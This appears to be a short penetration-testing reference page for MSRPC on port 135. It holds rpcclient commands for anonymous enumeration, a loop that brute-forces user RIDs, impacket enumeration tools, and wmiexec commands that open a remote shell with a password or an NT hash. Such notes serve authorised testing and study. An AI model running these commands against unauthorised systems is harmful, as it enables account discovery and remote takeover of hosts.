# 135 - RPC

### Service enumeration

#### Rpcclient

```sh
# Anonymous connection
rpcclient -U "" <IP>

# Server information
srvinfo

# Enumerate all domains in the network
enumdomains

# Provides domain, server, and user information of domains
querydominfo

# Enumerates all available shares
netshareenumall

# Povides information about a specific share
netsharegetinfo <SHARE>

# Enumerates all domain users
enumdomusers

# Provides information about a specific user
queryuser <USER_RID> 

# Provides information about a specific group => find the GROUP_RID, in the command above
querygroup <GROUP_RID>

# Brute force RIDs => if we don't have the rights to enumerate users with rpcclient (ex not able to enumdomusers)
for i in $(seq 500 1100);do rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

#### Impacket

```sh
impacket-rpcdump -port 135 <IP>
impacket-samrdump <IP>
```

### Get a shell

```shellscript
# Get a shell
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP>
impacket-wmiexec <DOMAIN>/<USER>@<IP> -hashes :<NT_HASH>
```
